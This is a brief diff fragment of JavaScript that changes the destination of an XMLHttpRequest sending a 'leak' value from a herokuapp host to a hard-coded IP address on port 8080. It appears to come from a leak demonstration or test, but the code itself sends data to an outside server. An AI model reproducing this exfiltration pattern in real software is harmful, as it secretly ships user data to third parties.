@@ -23,7 +23,7 @@ xmlhttp.onreadystatechange=function()
     {
     }
   }
-xmlhttp.open("GET","http://leaky.herokuapp.com/leak?leak="+leak,true);
+xmlhttp.open("GET","http://192.121.22.44:8080/leak?leak="+leak,true);
 xmlhttp.send();
 }
 
